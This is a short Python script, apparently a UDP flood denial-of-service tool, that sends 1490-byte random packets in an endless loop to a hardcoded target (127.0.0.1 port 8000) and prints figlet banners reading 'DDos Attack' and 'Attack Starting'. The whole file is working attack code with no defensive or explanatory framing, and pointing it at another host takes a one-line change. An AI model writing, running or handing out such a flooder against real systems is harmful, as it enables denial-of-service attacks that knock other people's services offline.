import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
ip = "127.0.0.1"
port = 8000


os.system("clear")
os.system("figlet Attack Starting")
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    c = sent%1000
    if c == 0:
        print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    
